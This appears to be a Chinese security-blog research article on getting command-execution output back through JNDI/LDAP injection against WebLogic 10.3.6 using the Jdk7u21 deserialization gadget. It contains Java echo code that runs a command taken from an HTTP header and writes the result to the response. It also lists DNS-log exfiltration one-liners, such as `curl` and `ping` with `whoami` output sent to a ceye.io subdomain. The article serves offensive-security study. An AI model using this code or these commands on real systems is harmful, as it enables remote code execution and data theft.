
# JNDI实现回显研究


                                阅读量   
                                **634469**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/200892/t018a28111dcc29fe4f.png)](./img/200892/t018a28111dcc29fe4f.png)



## 1、前言

最近出的回显文章内容毕竟多，linux下反序列化通杀回显，tomcat拿`org.apache.catalina.core.ApplicationDispatcher`类的response和request实现回显。之前就想过jndi注入能否实现回显，先看一遍jndi原理。

> <ol>
- 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；
- 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；
- 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；
- 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；
- 攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；
</ol>

当时的想法是，如果获取web服务器回显类，通过这种方式实现回显，必须是在web服务器运行时注入代码，也就是在web环境下。但是jndi是通过远端去加载恶意类，应该是不在web环境下。后来给清水川崎交流的时候，他说jndi也能实现回显，遂就有了下文。



## 2、环境构建

首先，搭建一个有jndi注入的web服务器，我这里选择weblogic 10.3.6版本，no patch，jdk版本选择Jdk7u21。用cve-2017-10271中`com.sun.rowset.JdbcRowSetImpl`这个payload打一发，本地先测成功。

[![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018702f953063cf7ec.png)

接着想法是`JNDI Naming Reference`的限制太多了，恶意类又难生成，LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化，这样利用ldap注入代码也方便点，下一步去找weblogic线程类，输入输出类。lufei表哥已经写过文章了：[https://xz.aliyun.com/t/5299#toc-9](https://xz.aliyun.com/t/5299#toc-9)，这就省了很多事。直接用他的代码：

```
String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader("lfcmd");
String[] cmds = new String[]{"cmd.exe", "/c", lfcmd};
java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\a");
String output = s.hasNext() ? s.next() : "";
weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();
weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();
outputStream.writeStream(new weblogic.xml.util.StringInputStream(output));
outputStream.flush();
response.getWriter().write("");
```

接着为了让服务器能够注入代码，选一条gadget，这里选择Jdk7u21这条链。怎么让gadget不执行命令，而是执行java代码看这篇文章：[https://blog.csdn.net/fnmsd/article/details/79534877](https://blog.csdn.net/fnmsd/article/details/79534877)

[![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015569e3619ca3f728.png)

拿到gadget 进行base64编码，拷贝到`HackerLDAPRefServer`类这里。

[![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0173b775a14ffaf056.png)

开启HackerLDAPRefServer，看一下回显效果，这里已经收到请求，回显也能够回显，看来是之前的猜想错了，还是rmi理解的不够深刻。

[![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c7eb7c596d87f442.png)



在重新理解rmi客户端和服务器相互调用时，看到6时，才反应过来，即使是远程加载恶意类，也相当于是本地执行，当然也就能拿到weblogic回显的线程类。



[![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0153036acc592f4301.png)

具体调试时，可以发现在触发jndi注入后，继续触发反序列化操作



[![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d2aaa1513436e14b.png)

下图就是执行代码过程，之前犯的错误就是上图，将jndi注入和反序列化操作割裂开了，实际是按顺序触发的。



[![](./img/200892/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014f1303cef4e3fddd.png)

## 3、jndi其他回显方法

最后提一嘴，jndi能出外网回显的利用总结，能弹shell那就不用说啥了：

> <p>1、 向系统可写web目录写文件/js文件写命令，在读取这个文件实现回显。（获取网站绝对路径，可以读.bash_hitory，服务器默认配置文件，框架自带的log，报错获得）<br>
2、通过dnslog拿到回显内容：<br>
windows:<br><code>第一步、whoami&gt;D:/temp&amp;&amp;certutil -encode D:/temp D:/temp2&amp;&amp;findstr /L /V ""CERTIFICATE"" D:/temp2&gt;D:/temp3<br>
第二步、set /p MYVAR=&lt; D:/temp3 &amp;&amp; set FINAL=%MYVAR%.xxxx.ceye.io &amp;&amp; ping %FINAL%<br>
第三步、del  "D:/temp" "D:/temp2" "D:/temp3"</code><br>
Linux:<br>
反引号命令执行<br>
curl `whoami`.xxx.ceye.io</p>



## 4、总结

实际，有了这个思路，**jndi也能够回显**（**划重点，面试官问的时候记住了**），可以结合很多web服务器搞，比如tomcat，Spring，Spring-Boot框架。虽然jndi需要出网，就显的很鸡肋了，但这也算是一种思路，毕竟知识面决定攻击面，知识链决定攻击深度，多掌握一个点，说不定就用上了。最后注入代码gadget有`ROME、CommonsBeanutils1、CommonsCollections2、CommonsCollections3、CommonsCollections4、Spring1、Spring2、Jdk7u21、MozillaRhino1、JBossInterceptors1、JavassistWeld1、JSON1、Hibernate1`，在Jdk7u21 gadget注入代码，javassist修改字节码时，添加泛型会出现报错，解决方法参考下面链接。（题外话，这个月在安全客连投了5篇，算是上一年研究的一点总结，现在手里没什么干货了，继续潜心修炼去了，遇到有意思的点，在发出来给大家分享。

### <a class="reference-link" name="%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"></a>参考链接：

[https://github.com/kxcode/JNDI-Exploit-Bypass-Demo](https://github.com/kxcode/JNDI-Exploit-Bypass-Demo)<br>[https://kingx.me/Exploit-Java-Deserialization-with-RMI.html](https://kingx.me/Exploit-Java-Deserialization-with-RMI.html)<br>[https://xz.aliyun.com/t/7348](https://xz.aliyun.com/t/7348)<br>[https://blog.csdn.net/kakaweb/article/details/84592472](https://blog.csdn.net/kakaweb/article/details/84592472)
